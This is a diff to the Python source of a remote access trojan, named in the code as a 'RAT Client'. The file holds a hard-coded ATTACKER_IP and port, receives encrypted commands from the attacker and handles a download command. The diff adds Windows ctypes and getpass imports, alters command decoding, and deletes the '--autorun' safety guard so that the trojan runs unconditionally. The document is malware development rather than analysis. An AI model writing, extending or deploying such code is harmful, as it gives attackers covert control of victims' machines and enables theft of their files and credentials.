@@ -14,6 +14,9 @@ from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 import base64
 import os as crypto_os
+from ctypes import windll
+import getpass
+
 
 ATTACKER_IP = "192.168.1.18"
 ATTACKER_PORT = 9999
@@ -299,7 +302,7 @@ def main():
                     time.sleep(RECONNECT_DELAY)
                     continue
 
-                decrypted_command = decrypt_data(data).decode('utf-8', errors='ignore').strip()
+                decrypted_command = decrypt_data(data).strip()
                 debug_print(f"Received command: {decrypted_command}")
 
                 if decrypted_command.startswith("download "):
@@ -350,6 +353,4 @@ def main():
         debug_print("RAT Client exiting.")
 
 if __name__ == "__main__":
-    if "--autorun" not in sys.argv:
-        sys.exit(0)
     main()
